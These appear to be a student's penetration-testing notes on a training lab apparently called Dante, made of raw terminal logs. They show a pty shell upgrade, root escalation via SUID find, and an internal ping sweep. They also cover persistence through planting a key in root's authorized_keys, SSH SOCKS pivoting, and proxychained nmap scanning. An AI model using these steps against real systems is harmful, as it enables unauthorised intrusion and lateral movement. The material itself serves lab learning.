+Linux DANTE-WEB-NIX01 5.4.0-29-generic #33-Ubuntu SMP Wed Apr 29 14:32:27 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 15:19:01 up 51 min,  2 users,  load average: 0.01, 0.05, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+james    :0       :0               14:28   ?xdm?   1:04   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
+balthaza pts/0    10.10.15.3       14:39   37:16   0.95s  0.90s ./agent -connect 10.10.15.3:11601 -ignore-cert
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@DANTE-WEB-NIX01:/$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+# nano pinger.sh
+nano pinger.sh
+Error opening terminal: unknown.
+# vi pinger.sh
+vi pinger.sh
+:q                              
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+# ls
+ls
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+# ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether a2:de:ad:13:34:87 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.1.100/24 brd 172.16.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::a0de:adff:fe13:3487/64 scope link 
+       valid_lft forever preferred_lft forever
+# for i in {1..255}; do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
+for i in {1..255}; do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
+# ping: 172.16.1.{1..255}: Name or service not known
+
+
+# 
+
+# 
+
+# 
+
+# ls
+ls
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+# for i in $(seq 1 255); do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
+for i in $(seq 1 255); do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
+172.16.1.5
+172.16.1.10
+172.16.1.12
+172.16.1.13
+172.16.1.17
+172.16.1.20
+172.16.1.19
+172.16.1.100
+172.16.1.101
+172.16.1.102
+# ping: Do you want to ping broadcast? Then -b. If not, check your local firewall rules
+
+```
 ifconfig
 - gives that we ve an other net interface lets scan it
 for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' - f4|tr -d ':' &);done
 in order to perform a pivoting within the network lets upgrade to a ssh by adding our pubkey to /root/.ssh/authorized_keys
 ssh -i id_rsa -D 9050 root@10.10.110.100 <-- make sure to conf the proxychains.conf file
 -> ligolo-ng
+```
+ ~  ssh -i id_rsa -D 9050 root@10.10.110.100
+Warning: Identity file id_rsa not accessible: No such file or directory.
+The authenticity of host '10.10.110.100 (10.10.110.100)' can't be established.
+ED25519 key fingerprint is: SHA256:Pj8NTFWehqCpZS0qnbXCKkHikSrFlHDgABvA2FE9Lu0
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.110.100' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-29-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+636 updates can be installed immediately.
+398 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Wed Oct 27 08:09:21 2021
+root@DANTE-WEB-NIX01:~#
+```
+
 proxychains nmap 172.16.1.10 -sT -sV -Pn -T5 <-- lets scan the discoverd net
 we discovered an http running lets connect
 proxychains firefox
